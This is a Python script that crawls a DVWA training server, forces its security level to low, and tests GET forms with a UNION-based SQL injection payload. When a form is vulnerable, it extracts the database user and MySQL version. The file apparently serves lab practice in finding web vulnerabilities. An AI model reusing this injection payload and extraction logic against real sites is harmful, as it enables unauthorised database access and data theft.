import argparse
import os
import asyncio
import re
import bs4
import async_timeout
from dataclasses import dataclass
from aiohttp import ClientSession
import yarl
from aiohttp.cookiejar import CookieJar
from ZODB import DB
from ZODB.FileStorage import FileStorage
from persistent import Persistent
import transaction


@dataclass
class VulnerabilityResult(Persistent):
    url: yarl.URL
    is_vulnerable: bool
    vulnerability_data: dict  # Consider replacing with frozendict.


@dataclass
class ScrapeTarget(Persistent):
    url: yarl.URL
    depth: int


@dataclass
class ScrapedPage(Persistent):
    target: ScrapeTarget
    links: set
    vulnerability_result: VulnerabilityResult


class ForceLowSecurityCookiesDVWA(CookieJar):
    def update_cookies(self, cookies, response_url):
        if "security" in cookies.keys():
            cookies["security"] = "low"
        super().update_cookies(cookies, response_url)


async def dvwa_login(session: ClientSession, url, username, password):
    loginFormData = {"username": username, "password": password, "Login": "Login"}
    async with async_timeout.timeout(1000):
        async with session.post(url, data=loginFormData) as response:
            # The DVWA server doesn't seem to return sensible status codes,
            # hence we validate login by checking that we are routed to somewhere
            # other than the login page. This is a kludge.
            if response.url == url:
                raise RuntimeError(
                    f"Could not log into DVWA with supplied credentials. "
                )


async def download_url(session, url) -> str:
    async with async_timeout.timeout(10):
        async with session.get(url) as response:
            return await response.read()


def extract_valid_links(url: yarl.URL, soup: bs4.BeautifulSoup):
    link_urls = set(
        url.with_path(link.attrs.get("href"))
        for link in soup.find_all("a")
        if link_is_valid(link)
    )
    return link_urls


def link_is_valid(link: bs4.BeautifulSoup):
    "Take "
    href = link.attrs.get("href")
    return (
        href is not None
        and yarl.URL(href).host is None
        and "download" not in link.attrs
    )


def build_params(
    text_field: bs4.BeautifulSoup, submit_field: bs4.BeautifulSoup, sql_injection: str
) -> dict:
    params = {
        text_field.attrs["name"]: sql_injection,
    }
    if "name" in submit_field.attrs:
        params[submit_field.attrs["name"]] = submit_field.attrs["value"]
    return params


async def sql_injection_vulnerability_checker(
    session: ClientSession, url: yarl.URL, soup: bs4.BeautifulSoup
) -> VulnerabilityResult:
    is_vulnerable = False
    vulnerability_data = {}

    special_sql = "CONCAT('hello_luna_the_dog', '_you_look_nice_today')"
    special_string = "hello_luna_the_dog_you_look_nice_today"

    sql_injection_template = "1' UNION SELECT {0} as last_name, {1} as first_name;#"
    sql_injection_test = sql_injection_template.format(special_sql, "'bob'")

    for form in soup.find_all("form"):
        # The following is very specific to the exact form on the target page
        if form.attrs["method"].lower() != "get":
            continue
        if len(form.find_all("input")) != 2:
            continue

        submit_field = form.find("input", {"type": "submit"})
        text_field = form.find("input", {"type": "text"})

        if submit_field is None or text_field is None:
            continue

        async with session.get(
            url, params=build_params(text_field, submit_field, sql_injection_test),
        ) as response:
            soup = bs4.BeautifulSoup(await response.read(), "html.parser")
            is_vulnerable = soup.find(string=re.compile(special_string)) is not None
        if is_vulnerable:
            async with session.get(
                url,
                params=build_params(
                    text_field,
                    submit_field,
                    sql_injection_template.format("user()", "version()"),
                ),
            ) as response:
                soup = bs4.BeautifulSoup(await response.read(), "html.parser")
                vulnerability_data["db_user"] = soup.find(
                    string=re.compile("^First name: (?!admin)")
                )[12:]
                vulnerability_data["db_version"] = soup.find(
                    string=re.compile("^Surname: (?!admin)")
                )[9:]

    return VulnerabilityResult(
        url=url, is_vulnerable=is_vulnerable, vulnerability_data=vulnerability_data,
    )


async def scrape_and_check_page_for_vulnerability(
    session: ClientSession, vulnerability_checker, scrape_target: ScrapeTarget
) -> ScrapedPage:
    soup = bs4.BeautifulSoup(
        await download_url(session, scrape_target.url), "html.parser"
    )
    return ScrapedPage(
        target=scrape_target,
        links=extract_valid_links(scrape_target.url, soup),
        vulnerability_result=await vulnerability_checker(
            session, scrape_target.url, soup
        ),
    )


class PersistenceHandler:
    def __init__(self, db_name):
        self.db_name = db_name

    def __enter__(self):
        self.db = DB(FileStorage(self.db_name))
        self.conn = self.db.open()
        self.root = self.conn.root()
        return self

    def __exit__(self, _, __, ___):
        try:
            self.conn.close()
        finally:
            self.db.close()

    def store_progress(self, scrape_targets, vulnerability_results):
        self.root["scrape_targets"] = scrape_targets
        self.root["vulnerability_results"] = vulnerability_results
        transaction.commit()

    def retrieve_progress(self):
        progress = []
        for key in ["scrape_targets", "vulnerability_results"]:
            try:
                progress.append(self.root[key])
            except KeyError:
                progress.append(list())
        return progress


async def scrape_dvwa(
    persistence_handler: PersistenceHandler,
    vulnerability_checker,
    start_url: yarl.URL,
    dvwa_username: str,
    dvwa_password: str,
    concurrency: int = 4,
    max_depth: int = 20,
):
    cookie_jar = ForceLowSecurityCookiesDVWA(unsafe=True)
    async with ClientSession(cookie_jar=cookie_jar) as session:
        await dvwa_login(
            session, start_url.with_path("login.php"), dvwa_username, dvwa_password,
        )

        urls_not_to_scrape = {start_url.with_path("logout.php")}

        (
            scrape_targets,
            vulnerability_results,
        ) = persistence_handler.retrieve_progress()

        if len(scrape_targets) == 0 and len(vulnerability_results) == 0:
            print(f"Starting new scrape from: {start_url}.")
            scrape_targets.append(ScrapeTarget(url=start_url, depth=0))
        elif len(scrape_targets) == 0 and len(vulnerability_results) > 0:
            print(f"Completed scrape found. Returning saved results.")
        else:
            print(
                f"Resuming in progress scrape with {len(vulnerability_results)} "
                "already scraped."
            )

        targets_being_scraped = []
        pending = set()
        while len(scrape_targets) > 0 or len(pending) > 0:
            while len(pending) < concurrency and len(scrape_targets) > 0:
                scrape_target = scrape_targets.pop()
                targets_being_scraped.append(scrape_target)
                pending.add(scrape_and_check_page_for_vulnerability(session, vulnerability_checker, scrape_target))

            done, pending = await asyncio.wait(
                pending, return_when=asyncio.FIRST_COMPLETED
            )
            for future in done:
                if future.exception():
                    raise future.exception()

                scraped_page: ScrapedPage = future.result()

                targets_being_scraped.remove(scraped_page.target)
                vulnerability_results.append(scraped_page.vulnerability_result)

                if scraped_page.target.depth < max_depth:
                    # N.B: These sets could be persisted at a higher scope for speed
                    new_urls_to_scrape = scraped_page.links - (
                        set(v.url for v in vulnerability_results)
                        | set(t.url for t in targets_being_scraped)
                        | set(t.url for t in scrape_targets)
                        | urls_not_to_scrape
                    )
                    scrape_targets += [
                        ScrapeTarget(url=url, depth=scraped_page.target.depth + 1)
                        for url in new_urls_to_scrape
                    ]

            persistence_handler.store_progress(
                scrape_targets + targets_being_scraped, vulnerability_results
            )

        return vulnerability_results


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "network_address", help="The network address of the DVWA server"
    )
    parser.add_argument(
        "--username", default="admin", help="The username used to log in to DVWA"
    )
    parser.add_argument(
        "--password",
        default="password",
        help="The password that is used to log into DVWA",
    )
    parser.add_argument(
        "--persist-location",
        help="The location to store the files that allow resuming a scrape "
        "in the event of a failure. Defaults to the working directory.",
        default=".",
    )

    args = parser.parse_args()

    loop = asyncio.get_event_loop()
    with PersistenceHandler(
        os.path.join(args.persist_location, args.network_address)
    ) as persistence_handler:
        task = loop.create_task(
            scrape_dvwa(
                persistence_handler,
                sql_injection_vulnerability_checker,
                yarl.URL(f"http://{args.network_address}/index.php"),
                args.username,
                args.password,
            )
        )
        loop.run_until_complete(task)
        vulnerability_results = task.result()
        vulnerabilities = [v for v in vulnerability_results if v.is_vulnerable]

        print(
            f"\nScraped {len(vulnerability_results)} pages and found "
            f"{len(vulnerabilities)} sql injection vulnerabilities in the "
            "following urls:"
        )
        for vuln in sorted(vulnerabilities, key=lambda x: x.url):
            print(f"\t{vuln.url}")
        if len(vulnerabilities) > 0:
            print(
                f"\nUsed SQL Injection vulnerability to extract the following"
                " information:"
            )
            print(f"\tMySQL version: {vuln.vulnerability_data['db_version']}")
            print(f"\tMySQL user: {vuln.vulnerability_data['db_user']}")
